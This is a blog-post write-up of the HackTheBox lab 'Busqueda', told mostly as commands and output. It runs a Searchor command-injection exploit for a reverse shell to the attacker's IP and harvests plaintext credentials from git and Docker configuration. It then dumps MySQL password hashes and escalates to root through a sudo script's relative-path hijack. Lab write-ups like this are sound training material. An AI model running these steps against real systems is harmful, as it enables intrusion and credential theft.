@@ -1,0 +1,149 @@
+---
+layout: post
+title:  "Writeup of Busqueda (HackTheBox)"
+date:   2023-11-18 18:06:00 +0000
+categories: hackthebox
+author: brun0ne
+tags: htb hackthebox busqueda gitea searchor
+---
+
+# Getting in
+There is a website on **:80** with a virtual hostname **searcher.htb**.
+
+It's running **Searchor 2.4.0** with a [known vulnerability](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection).
+
+`bash exploit.sh searcher.htb 10.10.14.144` gives a reverse shell as **svc**.
+
+`user.txt: <redacted>`
+
+# Enumeration
+
+```
+-rwxr-sr-x 1 root tty 23K Feb 21  2022 /usr/bin/write.ul (Unknown SGID binary)
+```
+
+```
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      1647/python3        
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:36155         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:222           0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+```
+
+```
+ServerName gitea.searcher.htb
+ServerAdmin admin@searcher.htb
+ProxyPass / http://127.0.0.1:3000/
+```
+
+```
+ServerName searcher.htb
+ServerAdmin admin@searcher.htb
+ProxyPass / http://127.0.0.1:5000/
+```
+
+There is another domain: **gitea.searcher.htb**
+
+`var/www/app/.git/config:        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git`
+
+# SSH - svc
+
+`ssh svc@searcher.htb`
+
+**svc:jh1usoih2bkjaspwe92** works for SSH!
+
+`sudo -l`
+
+```
+User svc may run the following commands on busqueda:
+    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+```
+
+`sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps`
+
+```
+CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS          PORTS                                             NAMES
+960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   5 months ago   Up 46 minutes   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
+f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   5 months ago   Up 46 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
+```
+
+**Let's extract all the data by running:**
+
+`sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' '960873171e2e'`
+
+`sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{join .Args " , "}}' 'f84a6b33fb5a'`
+
+```
+"GITEA__database__DB_TYPE=mysql",
+"GITEA__database__HOST=db:3306",
+"GITEA__database__NAME=gitea",
+"GITEA__database__USER=gitea",
+"GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
+```
+
+```
+"MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
+"MYSQL_USER=gitea",
+"MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
+"MYSQL_DATABASE=gitea",
+```
+
+The database runs on **172.19.0.3**.
+
+`mysql -h 172.19.0.3 -P 3306 -u root -p`
+
+We get some hashes:
+
+```
+name: administrator
+passwd: ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2
+passwd_hash_algo: pbkdf2
+rands: 44748ed806accc9d96bf9f495979b742
+salt: a378d3f64143b284f104c926b8b49dfb
+
+name: cody
+passwd: b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e
+passwd_hash_algo: pbkdf2
+rands: 304b5a2ce88b6d989ea5fae74cc6b3f3
+salt: d1db0a75a18e50de754be2aafcad5533
+```
+
+`administrator's password is the same as mysql -- yuiu1hoiu4i5ho1uh`
+
+`cody's -- jh1usoih2bkjaspwe92`
+
+So there's no point in cracking the hashes - and we got into **gitea** as **administrator**!
+
+# administrator's gitea
+
+There are 4 scripts in a private repo **scripts**:
+
+```
+check-ports.py
+full-checkup.py
+install-flask.sh
+system-checkup.py
+```
+
+By crafting a file named **full-checkup.sh** in /dev/shm (working dir):
+
+```
+#!/bin/bash
+
+id
+cat /root/root.txt
+```
+
+And executing:
+
+`chmod +x full-checkup.sh`
+
+`sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup`
+
+We get **root**!
+
+`root.txt: <redacted>`
